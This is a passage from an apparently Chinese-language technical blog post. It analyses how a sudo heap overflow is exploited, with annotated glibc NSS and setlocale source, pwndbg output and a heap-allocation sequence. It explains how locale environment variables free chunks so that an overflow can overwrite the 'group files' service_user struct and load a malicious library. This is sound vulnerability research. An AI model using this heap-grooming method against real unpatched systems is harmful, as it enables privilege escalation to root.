class="keyword">if</span> (line[<span class="number">0</span>] == <span class="string">&#x27;\\0&#x27;</span>)</span><br><span class="line">      <span class="keyword">continue</span>;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Each line completely specifies the actions for a database.  */</span></span><br><span class="line">    this = nss_getline (line);<span class="comment">// 处理配置文件中的每一行</span></span><br><span class="line">    <span class="keyword">if</span> (this != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> (last != <span class="literal">NULL</span>)</span><br><span class="line">        last-&gt;next = this;</span><br><span class="line">      <span class="keyword">else</span></span><br><span class="line">        result-&gt;entry = this;</span><br><span class="line"></span><br><span class="line">      last = this;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">while</span> (!__feof_unlocked (fp));</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> name_database_entry *</span><br><span class="line"><span class="title function_">nss_getline</span> <span class="params">(<span class="type">char</span> *line)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">  result-&gt;service = nss_parse_service_list (line);<span class="comment">// 处理文件中该行的所有服务规范</span></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="type">static</span> service_user *</span><br><span class="line"><span class="title function_">nss_parse_service_list</span> <span class="params">(<span class="type">const</span> <span class="type">char</span> *line)</span><span class="comment">// 处理每一个服务规范</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">while</span> (<span class="number">1</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    new_service = (service_user *) <span class="built_in">malloc</span> (<span class="keyword">sizeof</span> (service_user)</span><br><span class="line">                                           + (line - name + <span class="number">1</span>));</span><br><span class="line">    <span class="comment">// 赋值</span></span><br><span class="line">    *nextp = new_service;</span><br><span class="line">    nextp = &amp;new_service-&gt;next;</span><br><span class="line">    <span class="keyword">continue</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>当配置文件中所有的服务规范全部处理完毕之后，形成了下面的列表，其中链表头存储在<code>libc</code>中。</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; p &amp;service_table</span><br><span class="line"><span class="variable">$52</span> = (name_database **) 0x7ffff7f457a8 &lt;service_table&gt;</span><br><span class="line">pwndbg&gt; p *service_table</span><br><span class="line"><span class="variable">$53</span> = &#123;</span><br><span class="line">  entry = 0x5555555829d0,</span><br><span class="line">  library = 0x0</span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *service_table-&gt;entry</span><br><span class="line"><span class="variable">$54</span> = &#123;</span><br><span class="line">  next = 0x555555582a70,</span><br><span class="line">  service = 0x5555555829f0,</span><br><span class="line">  name = 0x5555555829e0 <span class="string">&quot;passwd&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *service_table-&gt;entry-&gt;next</span><br><span class="line"><span class="variable">$55</span> = &#123;</span><br><span class="line">  next = 0x5555555885b0,</span><br><span class="line">  service = 0x555555588530,</span><br><span class="line">  name = 0x555555582a80 <span class="string">&quot;group&quot;</span></span><br><span class="line">&#125;</span><br><span class="line">pwndbg&gt; p *service_table-&gt;entry-&gt;next-&gt;service</span><br><span class="line"><span class="variable">$56</span> = &#123;</span><br><span class="line">  next = 0x555555588570,</span><br><span class="line">  actions = &#123;NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_CONTINUE, NSS_ACTION_RETURN, NSS_ACTION_RETURN&#125;,</span><br><span class="line">  library = 0x0,</span><br><span class="line">  known = 0x0,</span><br><span class="line">  name = 0x555555588560 <span class="string">&quot;files&quot;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>经过调试发现<code>get_user_info</code>函数中的堆块申请顺序如下</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">malloc</span>(<span class="number">0x100</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x400</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1d8</span>)<span class="comment">// tcache</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x10</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x78</span>)<span class="comment">// 固定0x80 // 释放</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x1000</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x17</span>)<span class="comment">// 以下均为固定申请，且不会释放</span></span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x36</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x38</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x16</span>)</span><br><span class="line"><span class="built_in">malloc</span>(<span class="number">0x36</span>)<span class="comment">// group files</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>在<code>glibc&gt;2.27</code>版本之上由于存在<code>tcache</code>，因此在申请堆块的时候会首先判断<code>tcache</code>中是否存在空闲的堆块。我们的目的是覆写<code>group files</code>堆块，从<code>exp</code>来看，攻击者首先是获取了<code>free</code>的原语，得到可以释放任意大小和数量的堆块之后进行了下面的布置。首先是<code>2</code>个<code>0x40</code>大小的堆块用来满足<code>passwd</code>的<code>service_user</code>的堆块的申请，然后释放一个堆块，用来满足<code>user_args</code>堆块的申请，然后再释放一个<code>0x40</code>大小的堆块用来满足<code>group files service_user</code>的堆块的申请。</p>
<p>那么在<code>get_user_info</code>函数初始化所有的<code>service_user</code>堆块之后，在之后溢出<code>user_args</code>的时候就可以直接溢出到<code>group files</code>的<code>service_user</code>结构体，就可以进行加载我们自己的动态链接库<code>getshell</code>。</p>
<h3 id="free-原语"><a href="#free-原语" class="headerlink" title="free 原语"></a>free 原语</h3><p><code>sudo</code>在<code>main</code>函数的起始位置<code>sudo.c:154</code>调用了<code>setlocale(LC_ALL, &quot;&quot;);</code>函数，其中<code>locale=&quot;&quot;</code>表示根据环境变量来设置<code>locale</code>。<code>setlocale</code>会申请和释放大量的堆块。来看一下<code>setlocale</code>函数的源码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//setlocale(LC_ALL, &quot;&quot;);</span></span><br><span class="line"><span class="comment">//glibc/locale/setlocale.c</span></span><br><span class="line"><span class="type">char</span> *</span><br><span class="line"><span class="title function_">setlocale</span> <span class="params">(<span class="type">int</span> category, <span class="type">const</span> <span class="type">char</span> *locale)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">char</span> *locale_path;</span><br><span class="line">  <span class="type">size_t</span> locale_path_len;</span><br><span class="line">  <span class="type">const</span> <span class="type">char</span> *locpath_var;</span><br><span class="line">  <span class="type">char</span> *composite;</span><br><span class="line"></span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (category == LC_ALL)</span><br><span class="line">  &#123;</span><br><span class="line">   <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Load the new data for each category.  */</span></span><br><span class="line">    <span class="keyword">while</span> (category-- &gt; <span class="number">0</span>)</span><br><span class="line">      <span class="keyword">if</span> (category != LC_ALL)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">// 循环查找环境变量中的LC*环境变量的值，并根据优先级顺序进行加载，环境变量的值会存储在newnames中</span></span><br><span class="line">        newdata[category] = _nl_find_locale (locale_path, locale_path_len,</span><br><span class="line">                                             category,</span><br><span class="line">                                             &amp;newnames[category]);</span><br><span class="line"></span><br><span class="line">        <span class="comment">//...</span></span><br><span class="line">      &#125;</span><br><span class="line">    <span class="comment">/* Create new composite name.  */</span></span><br><span class="line">    composite = (category &gt;= <span class="number">0</span></span><br><span class="line">                 ? <span class="literal">NULL</span> : new_composite_name (LC_ALL, newnames));</span><br><span class="line">    <span class="keyword">if</span> (composite != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">//setname&amp;setdata，即为_nl_global_locale.__names数组赋值，该数组中存储有所有的环境变量的值</span></span><br><span class="line">      <span class="comment">// 如果数组中原来存储有值，且不是默认的&quot;C&quot;，那么会释放原有的堆块</span></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span></span><br><span class="line">      <span class="keyword">for</span> (++category; category &lt; __LC_LAST; ++category)</span><br><span class="line">        <span class="keyword">if</span> (category != LC_ALL &amp;&amp; newnames[category] != _nl_C_name</span><br><span class="line">            &amp;&amp; newnames[category] != _nl_global_locale.__names[category])</span><br><span class="line">          <span class="built_in">free</span> ((<span class="type">char</span> *) newnames[category]);<span class="comment">// 释放所有的newnames即环境变量的值</span></span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> composite;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">//...</span></span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line">libc_hidden_def (setlocale)</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> __<span class="title">locale_data</span> *</span></span><br><span class="line"><span class="class">  _<span class="title">nl_find_locale</span> (<span class="title">const</span> <span class="title">char</span> *<span class="title">locale_path</span>, <span class="title">size_t</span> <span class="title">locale_path_len</span>,</span></span><br><span class="line"><span class="class">                   <span class="title">int</span> <span class="title">category</span>, <span class="title">const</span> <span class="title">char</span> **<span class="title">name</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cloc_name[<span class="number">0</span>] == <span class="string">&#x27;\\0&#x27;</span>)<span class="comment">// 这里获取栈中的LC_ALL变量的值</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* The user decides which locale to use by setting environment</span></span><br><span class="line"><span class="comment">	 variables.  */</span></span><br><span class="line">    cloc_name = getenv (<span class="string">&quot;LC_ALL&quot;</span>);<span class="comment">// 按照环境变量生效的顺序进行get</span></span><br><span class="line">    <span class="keyword">if</span> (!name_present (cloc_name))</span><br><span class="line">      cloc_name = getenv (_nl_category_names_get (category));</span><br><span class="line">    <span class="keyword">if</span> (!name_present (cloc_name))</span><br><span class="line">      cloc_name = getenv (<span class="string">&quot;LANG&quot;</span>);</span><br><span class="line">    <span class="keyword">if</span> (!name_present (cloc_name))</span><br><span class="line">      cloc_name = _nl_C_name;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="keyword">else</span> <span class="keyword">if</span> (!valid_locale_name (cloc_name))<span class="comment">// 这里变量的值最大为255即0xff</span></span><br><span class="line">  &#123;</span><br><span class="line">    __set_errno (EINVAL);</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  *name = cloc_name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* We really have to load some data.  First we try the archive,</span></span><br><span class="line"><span class="comment">     but only if there was no LOCPATH environment variable specified.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_likely (locale_path == <span class="literal">NULL</span>))</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> __<span class="title">locale_data</span> *<span class="title">data</span></span></span><br><span class="line"><span class="class">      =</span> _nl_load_locale_from_archive (category, name);</span><br><span class="line">    <span class="keyword">if</span> (__glibc_likely (data != <span class="literal">NULL</span>))</span><br><span class="line">      <span class="keyword">return</span> data;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Nothing in the archive with the given name.  Expanding it as</span></span><br><span class="line"><span class="comment">	 an alias and retry.  */</span></span><br><span class="line">    cloc_name = _nl_expand_alias (*name);</span><br><span class="line">    <span class="keyword">if</span> (cloc_name != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      data = _nl_load_locale_from_archive (category, &amp;cloc_name);</span><br><span class="line">      <span class="keyword">if</span> (__builtin_expect (data != <span class="literal">NULL</span>, <span class="number">1</span>))</span><br><span class="line">        <span class="keyword">return</span> data;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/* Nothing in the archive.  Set the default path to search below.  */</span></span><br><span class="line">    locale_path = _nl_default_locale_path;</span><br><span class="line">    locale_path_len = <span class="keyword">sizeof</span> _nl_default_locale_path;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="comment">/* We really have to load some data.  First see whether the name is</span></span><br><span class="line"><span class="comment">       an alias.  Please note that this makes it impossible to have &quot;C&quot;</span></span><br><span class="line"><span class="comment">       or &quot;POSIX&quot; as aliases.  */</span></span><br><span class="line">    cloc_name = _nl_expand_alias (*name);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (cloc_name == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="comment">/* It is no alias.  */</span></span><br><span class="line">    cloc_name = *name;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Make a writable copy of the locale name.  */</span></span><br><span class="line">  <span class="type">char</span> *loc_name = strdupa (cloc_name);</span><br><span class="line"></span><br><span class="line">	<span class="comment">// language[_territory[.codeset]][@modifier]</span></span><br><span class="line">  <span class="comment">// 下面将按照👆的格式一依次进行解析，normalized_codeset是小写的codeset</span></span><br><span class="line">  mask = _nl_explode_name (loc_name, &amp;language, &amp;modifier, &amp;territory,</span><br><span class="line">                           &amp;codeset, &amp;normalized_codeset);</span><br><span class="line">  <span class="keyword">if</span> (mask == <span class="number">-1</span>)</span><br><span class="line">    <span class="comment">/* Memory allocate problem.  */</span></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* If exactly this locale was already asked for we have an entry with</span></span><br><span class="line"><span class="comment">     the complete name.  */</span></span><br><span class="line">  <span class="comment">//</span></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    abs_filename = (char *) malloc (dirlist_len</span></span><br><span class="line"><span class="comment">				  + strlen (language)</span></span><br><span class="line"><span class="comment">				  + ((mask &amp; XPG_TERRITORY) != 0</span></span><br><span class="line"><span class="comment">				     ? strlen (territory) + 1 : 0)</span></span><br><span class="line"><span class="comment">				  + ((mask &amp; XPG_CODESET) != 0</span></span><br><span class="line"><span class="comment">				     ? strlen (codeset) + 1 : 0)</span></span><br><span class="line"><span class="comment">				  + ((mask &amp; XPG_NORM_CODESET) != 0</span></span><br><span class="line"><span class="comment">				     ? strlen (normalized_codeset) + 1 : 0)</span></span><br><span class="line"><span class="comment">				  + ((mask &amp; XPG_MODIFIER) != 0</span></span><br><span class="line"><span class="comment">				     ? strlen (modifier) + 1 : 0)</span></span><br><span class="line"><span class="comment">				  + 1 + strlen (filename) + 1);</span></span><br><span class="line"><span class="comment">	*/</span></span><br><span class="line">  <span class="comment">// 👇这个函数最为重要的是按照 👆的计算公式进行堆块的分配和释放</span></span><br><span class="line">  locale_file = _nl_make_l10nflist (&amp;_nl_locale_file_list[category],</span><br><span class="line">                                    locale_path, locale_path_len, mask,</span><br><span class="line">                                    language, territory, codeset,</span><br><span class="line">                                    normalized_codeset, modifier,</span><br><span class="line">                                    _nl_category_names_get (category), <span class="number">0</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (locale_file == <span class="literal">NULL</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="comment">/* Find status record for addressed locale file.  We have to search</span></span><br><span class="line"><span class="comment">	 through all directories in the locale path.  */</span></span><br><span class="line">    locale_file = _nl_make_l10nflist (&amp;_nl_locale_file_list[category],</span><br><span class="line">                                      locale_path, locale_path_len, mask,</span><br><span class="line">                                      language, territory, codeset,</span><br><span class="line">                                      normalized_codeset, modifier,</span><br><span class="line">                                      _nl_category_names_get (category), <span class="number">1</span>);</span><br><span class="line">    <span class="keyword">if</span> (locale_file == <span class="literal">NULL</span>)</span><br><span class="line">      <span class="comment">/* This means we are out of core.  */</span></span><br><span class="line">      <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//intl/l10nflist.c</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">loaded_l10nfile</span> *</span></span><br><span class="line"><span class="class">  _<span class="title">nl_make_l10nflist</span> (<span class="keyword">struct</span> <span class="title">loaded_l10nfile</span> **<span class="title">l10nfile_list</span>,</span></span><br><span class="line"><span class="class">                      <span class="title">const</span> <span class="title">char</span> *<span class="title">dirlist</span>, <span class="title">size_t</span> <span class="title">dirlist_len</span>,</span></span><br><span class="line"><span class="class">                      <span class="title">int</span> <span class="title">mask</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">language</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">territory</span>,</span></span><br><span class="line"><span class="class">                      <span class="title">const</span> <span class="title">char</span> *<span class="title">codeset</span>, <span class="title">const</span> <span class="title">char</span> *<span class="title">normalized_codeset</span>,</span></span><br><span class="line"><span class="class">                      <span class="title">const</span> <span class="title">char</span> *<span class="title">modifier</span>,</span></span><br><span class="line"><span class="class">                      <span class="title">const</span> <span class="title">char</span> *<span class="title">filename</span>, <span class="title">int</span> <span class="title">do_allocate</span>)</span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">char</span> *abs_filename;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">loaded_l10nfile</span> *<span class="title">last</span> =</span> <span class="literal">NULL</span>;</span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">loaded_l10nfile</span> *<span class="title">retval</span>;</span></span><br><span class="line">  <span class="type">char</span> *cp;</span><br><span class="line">  <span class="type">size_t</span> entries;</span><br><span class="line">  <span class="type">int</span> cnt;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Allocate room for the full file name.  */</span></span><br><span class="line">  <span class="comment">// 这里按照环境变量进行了堆块的分配，注意到这里传入的参数do_allocate=0</span></span><br><span class="line">  <span class="comment">// dirlist_len为0x10</span></span><br><span class="line">  abs_filename = (<span class="type">char</span> *) <span class="built_in">malloc</span> (dirlist_len</span><br><span class="line">                                  + <span class="built_in">strlen</span> (language)</span><br><span class="line">                                  + ((mask &amp; XPG_TERRITORY) != <span class="number">0</span></span><br><span class="line">                                     ? <span class="built_in">strlen</span> (territory) + <span class="number">1</span> : <span class="number">0</span>)</span><br><span class="line">                                  + ((mask &amp; XPG_CODESET) != <span class="number">0</span></span><br><span class="line">                                     ? <span class="built_in">strlen</span> (codeset) + <span class="number">1</span> : <span class="number">0</span>)</span><br><span class="line">                                  + ((mask &amp; XPG_NORM_CODESET) != <span class="number">0</span></span><br><span class="line">                                     ? <span class="built_in">strlen</span> (normalized_codeset) + <span class="number">1</span> : <span class="number">0</span>)</span><br><span class="line">                                  + ((mask &amp; XPG_MODIFIER) != <span class="number">0</span></span><br><span class="line">                                     ? <span class="built_in">strlen</span> (modifier) + <span class="number">1</span> : <span class="number">0</span>)</span><br><span class="line">                                  + <span class="number">1</span> + <span class="built_in">strlen</span> (filename) + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">  <span class="keyword">if</span> (abs_filename == <span class="literal">NULL</span>)</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// 这里会根据mask的值进行路径的拷贝</span></span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Look in list of already loaded domains whether it is already</span></span><br><span class="line"><span class="comment">     available.  */</span></span><br><span class="line">  last = <span class="literal">NULL</span>;</span><br><span class="line">  <span class="keyword">for</span> (retval = *l10nfile_list; retval != <span class="literal">NULL</span>; retval = retval-&gt;next)</span><br><span class="line">    <span class="keyword">if</span> (retval-&gt;filename != <span class="literal">NULL</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="type">int</span> compare = <span class="built_in">strcmp</span> (retval-&gt;filename, abs_filename);</span><br><span class="line">      <span class="keyword">if</span> (compare == <span class="number">0</span>)</span><br><span class="line">        <span class="comment">/* We found it!  */</span></span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">if</span> (compare &lt; <span class="number">0</span>)</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="comment">/* It&#x27;s not in the list.  */</span></span><br><span class="line">        retval = <span class="literal">NULL</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      &#125;</span><br><span class="line"></span><br><span class="line">      last = retval;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="comment">// 如果文件在l10nfile_list列表中，即之前已经查看过了，那么这里就直接释放abs_filename即之前申请的堆块。</span></span><br><span class="line">  <span class="keyword">if</span> (retval != <span class="literal">NULL</span> || do_allocate == <span class="number">0</span>)</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">free</span> (abs_filename);<span class="comment">// 这里会释放开头申请的堆块</span></span><br><span class="line">    <span class="keyword">return</span> retval;</span><br><span class="line">  &#125;</span><br><span class="line"><span class="comment">//...</span></span><br><span class="line">  <span class="comment">// 这里通过改变mask（组合territory,codeset等通过mask控制的参数），穷举路径搜索配置文件</span></span><br><span class="line">  cnt = __argz_count (dirlist, dirlist_len) == <span class="number">1</span> ? mask - <span class="number">1</span> : mask;</span><br><span class="line">  <span class="keyword">for</span> (; cnt &gt;= <span class="number">0</span>; --cnt)</span><br><span class="line">    <span class="keyword">if</span> ((cnt &amp; ~mask) == <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* Iterate over all elements of the DIRLIST.  */</span></span><br><span class="line">      <span class="type">char</span> *dir = <span class="literal">NULL</span>;</span><br><span class="line"></span><br><span class="line">      <span class="keyword">while</span> ((dir = __argz_next ((<span class="type">char</span> *) dirlist, dirlist_len, dir))</span><br><span class="line">             != <span class="literal">NULL</span>)</span><br><span class="line">        retval-&gt;successor[entries++]</span><br><span class="line">        = _nl_make_l10nflist (l10nfile_list, dir, <span class="built_in">strlen</span> (dir) + <span class="number">1</span>, cnt,</span><br><span class="line">                              language, territory, codeset,</span><br><span class="line">                              normalized_codeset, modifier, filename, <span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="comment">//...</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">return</span> retval;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>

